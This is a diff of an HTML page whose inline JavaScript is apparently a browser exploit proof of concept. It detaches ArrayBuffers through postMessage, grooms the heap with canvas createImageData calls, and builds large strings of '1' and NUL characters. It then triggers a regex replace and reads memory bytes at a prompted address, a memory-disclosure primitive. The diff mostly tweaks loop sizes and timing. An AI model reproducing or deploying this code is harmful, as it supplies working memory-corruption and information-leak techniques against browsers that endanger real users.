@@ -1,66 +1,129 @@
-
 <script>
-alert("start5");
+
+alert("start6");
+
 function neuter(ab) {
+
     postMessage("", "*", [ab]);
+
 }
+
 function gc() {
+
     try {
+
         var c = document.createElement("canvas");
+
         var gl = c.getContext("2d");
 
-        for (var i = 0; i < 0x3A; i++) {
-            var gggg = gl.createImageData(1, 0x2000)
+
+
+        for (var i = 0; i < 0x1000; i++) {
+
+            var gggg = gl.createImageData(1, 0x200)
+
         }
+
     } catch (e) {
 
+
+
     }
-}
-function createStringWithRepeatedChar(c, multiplicity) {
-    while (c.length < multiplicity)
-        c += c;
-    return c;
-}
-var x = "1";
-var y = "\u0000";
-var tmpy="";
-for(var i=0;i<0x50;i++){
-    tmpy+="\u0000";
-}
-var array=new Array(0x100);
-var mystr=createStringWithRepeatedChar("M",(1 << 16) );
-y = createStringWithRepeatedChar(y,(1 << 16) );
-x = createStringWithRepeatedChar(x, 1 << 16);
-x+="1";
-y=tmpy+y.substring(0,y.length-0x50);
-x.substring(0,5);
-mystr.substring(0,5);
-y.substring(0,5);
-mystr=0;
-/* for(var i=0;i<array.length;i++){
-array[i] =createStringWithRepeatedChar("M", 1 << 12);
-array[i].substr(0,5);
 
 }
+
+function createStringWithRepeatedChar(c, multiplicity) {
+
+    while (c.length < multiplicity)
+
+        c += c;
+
+    return c;
+
+}
+
+var x = "1";
+
+var y = "\u0000";
+
+var tmpy="";
+
+for(var i=0;i<0x50;i++){
+
+    tmpy+="\u0000";
+
+}
+
+var array=new Array(0x100);
+
+var mystr=createStringWithRepeatedChar("M",(1 << 16) );
+
+y = createStringWithRepeatedChar(y,(1 << 16) );
+
+x = createStringWithRepeatedChar(x, 1 << 16);
+
+x+="1";
+
+y=tmpy+y.substring(0,y.length-0x50);
+
+x.substring(0,5);
+
+mystr.substring(0,5);
+
+y.substring(0,5);
+
+mystr=0;
+
+/* for(var i=0;i<array.length;i++){
+
+array[i] =createStringWithRepeatedChar("M", 1 << 12);
+
+array[i].substr(0,5);
+
+
+
+}
+
 for(var i=0;i<array.length;i++){
+
 if(i%2){
+
 array[i]=0;
+
 }
+
 }*/
+
 function myfunc(){
+
 //alert("to trigger");
+
 gc();
+
 eval("x.replace(/\\d/g, y)");
+
 alert("ok");
+
 var a=prompt("addr");
+
 a=a/2;
+
 var b;
+
 for(var i=0;i<0x8;i++){
+
  b+=y.charCodeAt(a+i).toString(16);
+
  b+=" ";
+
 }
+
 alert(b);
+
 alert("end");
+
 }
-setTimeout(myfunc,6000);
+
+setTimeout(myfunc,10000);
+
 </script>
